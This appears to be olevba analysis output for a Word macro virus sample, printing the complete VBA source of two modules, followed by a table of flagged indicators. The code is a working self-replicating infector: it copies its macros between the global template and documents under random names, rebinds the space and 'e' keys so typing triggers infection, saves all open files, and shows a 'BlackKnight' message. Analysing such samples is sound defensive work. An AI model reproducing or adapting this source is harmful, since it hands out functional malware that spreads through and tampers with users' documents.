olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Nj-wmdlk1
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Nj-wmdlk1 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO DOFYBPIT.bas 
in file: Virus.MSWord.Nj-wmdlk1 - OLE stream: 'Macros/VBA/DOFYBPIT'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim A$
Dim CO$
Dim OC$
On Error GoTo -1: On Error GoTo Finish

A$ = WordBasic.[FileName$]()
If A$ = "" Then GoTo Finish

CO$ = WordBasic.[GetProfileString$]("Intl", "Info1")
OC$ = WordBasic.[GetProfileString$]("Intl", "Info2")

If VInstalled = 1 Then
    GoTo Finish
Else
    On Error Resume Next
    WordBasic.FileSaveAs Format:=1
    Run1
    Run2
    WordBasic.FileSaveAll 1, 0
End If

Finish:
A$ = WordBasic.[FileName$]()
If A$ = "" Then
    GoTo Finito
Else
    WordBasic.Insert " "
End If

Finito:
End Sub

Private Sub Run1()
Dim X$
Dim F$
Dim G$
Dim H$
Dim J$
Dim Y$
Dim Z$
Dim CO$
X$ = Fun$(F$, G$, H$, J$)
Y$ = Fun$(F$, G$, H$, J$)

Z$ = X$ + Y$

CO$ = WordBasic.[GetProfileString$]("Intl", "Info2")
WordBasic.MacroCopy "Global:" + CO$, WordBasic.[FileName$]() + ":" + Z$, 1
WordBasic.SetDocumentVar "VirName", Z$
WordBasic.ToolsCustomizeKeyboard KeyCode:=32, Category:=2, Name:=Z$, Add:=1, Context:=1
End Sub

Private Sub Run2()
Dim X$
Dim F$
Dim G$
Dim H$
Dim J$
Dim Y$
Dim Z$
Dim OC$
X$ = Fun$(F$, G$, H$, J$)
Y$ = Fun$(F$, G$, H$, J$)

Z$ = X$ + Y$

OC$ = WordBasic.[GetProfileString$]("Intl", "Info1")
WordBasic.MacroCopy "Global:" + OC$, WordBasic.[FileName$]() + ":" + Z$, 1
WordBasic.SetDocumentVar "VirNameDoc", Z$
WordBasic.ToolsCustomizeKeyboard KeyCode:=69, Category:=2, Name:=Z$, Add:=1, Context:=1
End Sub

Private Function VInstalled()
Dim CC$
Dim i
On Error Resume Next
CC$ = WordBasic.[GetDocumentVar$]("VirNameDoc")
    VInstalled = 0
    If WordBasic.CountMacros(1) > 0 Then
        For i = 1 To WordBasic.CountMacros(1)
            If WordBasic.[MacroName$](i, 1) = CC$ Then
                VInstalled = 1
            End If
        Next i
    End If
End Function

Private Function Fun$(F$, G$, H$, J$)
Dim One
Dim Two
Dim Num
Dim A$
Dim B$
Dim C$
Dim D$
Dim E$
One = 1169
Two = 9294
Num = WordBasic.Int(Rnd() * (Two - One) + One)
A$ = Str(Num)
A$ = WordBasic.[LTrim$](A$)

B$ = Mid(A$, 1, 1)
C$ = Mid(A$, 2, 1)
D$ = Mid(A$, 3, 1)
E$ = Mid(A$, 4, 1)

If B$ = "1" Then F$ = "A"
If B$ = "2" Then F$ = "B"
If B$ = "3" Then F$ = "C"
If B$ = "4" Then F$ = "D"
If B$ = "5" Then F$ = "E"
If B$ = "6" Then F$ = "F"
If B$ = "7" Then F$ = "G"
If B$ = "8" Then F$ = "H"
If B$ = "9" Then F$ = "I"
If B$ = "0" Then F$ = "J"

If C$ = "1" Then G$ = "H"
If C$ = "2" Then G$ = "I"
If C$ = "3" Then G$ = "J"
If C$ = "4" Then G$ = "K"
If C$ = "5" Then G$ = "L"
If C$ = "6" Then G$ = "M"
If C$ = "7" Then G$ = "N"
If C$ = "8" Then G$ = "O"
If C$ = "9" Then G$ = "P"
If C$ = "0" Then G$ = "Q"

If D$ = "1" Then H$ = "A"
If D$ = "2" Then H$ = "B"
If D$ = "3" Then H$ = "C"
If D$ = "4" Then H$ = "D"
If D$ = "5" Then H$ = "E"
If D$ = "6" Then H$ = "F"
If D$ = "7" Then H$ = "G"
If D$ = "8" Then H$ = "H"
If D$ = "9" Then H$ = "I"
If D$ = "0" Then H$ = "J"

If E$ = "1" Then J$ = "R"
If E$ = "2" Then J$ = "S"
If E$ = "3" Then J$ = "T"
If E$ = "4" Then J$ = "U"
If E$ = "5" Then J$ = "V"
If E$ = "6" Then J$ = "W"
If E$ = "7" Then J$ = "X"
If E$ = "8" Then J$ = "Y"
If E$ = "9" Then J$ = "Z"
If E$ = "0" Then J$ = "Q"

Fun$ = F$ + G$ + H$ + J$
End Function
-------------------------------------------------------------------------------
VBA MACRO DIJRCJCY.bas 
in file: Virus.MSWord.Nj-wmdlk1 - OLE stream: 'Macros/VBA/DIJRCJCY'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim A$
On Error GoTo -1: On Error GoTo Done

A$ = WordBasic.[FileName$]()
If A$ = "" Then GoTo Finish

If VInstalled = 0 Then
    Run1
    Run2
    WordBasic.FileSaveAll 1, 1
Else
    GoTo Done
End If

Done:
A$ = WordBasic.[FileName$]()
If A$ = "" Then
    GoTo Finish
Else
    WordBasic.Insert "e"
End If

Finish:
WordBasic.MsgBox "BlackKnight", -8
End Sub

Private Sub Run1()
Dim X$
Dim F$
Dim G$
Dim H$
Dim J$
Dim Y$
Dim Z$
Dim R1$
Dim CO$
X$ = Fun$(F$, G$, H$, J$)
Y$ = Fun$(F$, G$, H$, J$)

Z$ = X$ + Y$

R1$ = WordBasic.[GetDocumentVar$]("VirNameDoc")
CO$ = WordBasic.[FileName$]() + ":" + R1$
WordBasic.MacroCopy CO$, "Global:" + Z$, 1
WordBasic.SetProfileString "Intl", "Info2", Z$
WordBasic.ToolsCustomizeKeyboard KeyCode:=32, Category:=2, Name:=Z$, Add:=1, Context:=0
End Sub

Private Sub Run2()
Dim X$
Dim F$
Dim G$
Dim H$
Dim J$
Dim Y$
Dim Z$
Dim R2$
Dim OC$
X$ = Fun$(F$, G$, H$, J$)
Y$ = Fun$(F$, G$, H$, J$)

Z$ = X$ + Y$

R2$ = WordBasic.[GetDocumentVar$]("VirName")
OC$ = WordBasic.[FileName$]() + ":" + R2$
WordBasic.MacroCopy OC$, "Global:" + Z$, 1
WordBasic.SetProfileString "Intl", "Info1", Z$
WordBasic.ToolsCustomizeKeyboard KeyCode:=69, Category:=2, Name:=Z$, Add:=1, Context:=0
End Sub

Private Function VInstalled()
Dim CC$
Dim i
CC$ = WordBasic.[GetProfileString$]("Intl", "Info1")
    VInstalled = 0
    If WordBasic.CountMacros(0) > 0 Then
        For i = 1 To WordBasic.CountMacros(0)
        If WordBasic.[MacroName$](i, 0) = CC$ Then
            VInstalled = 1
        End If
    Next i
End If
End Function

Private Function Fun$(F$, G$, H$, J$)
Dim One
Dim Two
Dim Num
Dim A$
Dim B$
Dim C$
Dim D$
Dim E$
One = 1169
Two = 9294
Num = WordBasic.Int(Rnd() * (Two - One) + One)
A$ = Str(Num)
A$ = WordBasic.[LTrim$](A$)

B$ = Mid(A$, 1, 1)
C$ = Mid(A$, 2, 1)
D$ = Mid(A$, 3, 1)
E$ = Mid(A$, 4, 1)

If B$ = "1" Then F$ = "A"
If B$ = "2" Then F$ = "B"
If B$ = "3" Then F$ = "C"
If B$ = "4" Then F$ = "D"
If B$ = "5" Then F$ = "E"
If B$ = "6" Then F$ = "F"
If B$ = "7" Then F$ = "G"
If B$ = "8" Then F$ = "H"
If B$ = "9" Then F$ = "I"
If B$ = "0" Then F$ = "J"

If C$ = "1" Then G$ = "H"
If C$ = "2" Then G$ = "I"
If C$ = "3" Then G$ = "J"
If C$ = "4" Then G$ = "K"
If C$ = "5" Then G$ = "L"
If C$ = "6" Then G$ = "M"
If C$ = "7" Then G$ = "N"
If C$ = "8" Then G$ = "O"
If C$ = "9" Then G$ = "P"
If C$ = "0" Then G$ = "Q"

If D$ = "1" Then H$ = "A"
If D$ = "2" Then H$ = "B"
If D$ = "3" Then H$ = "C"
If D$ = "4" Then H$ = "D"
If D$ = "5" Then H$ = "E"
If D$ = "6" Then H$ = "F"
If D$ = "7" Then H$ = "G"
If D$ = "8" Then H$ = "H"
If D$ = "9" Then H$ = "I"
If D$ = "0" Then H$ = "J"

If E$ = "1" Then J$ = "R"
If E$ = "2" Then J$ = "S"
If E$ = "3" Then J$ = "T"
If E$ = "4" Then J$ = "U"
If E$ = "5" Then J$ = "V"
If E$ = "6" Then J$ = "W"
If E$ = "7" Then J$ = "X"
If E$ = "8" Then J$ = "Y"
If E$ = "9" Then J$ = "Z"
If E$ = "0" Then J$ = "Q"

Fun$ = F$ + G$ + H$ + J$
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Base64    |"{e                 |Intl                                         |
|String    |                    |                                             |
+----------+--------------------+---------------------------------------------+

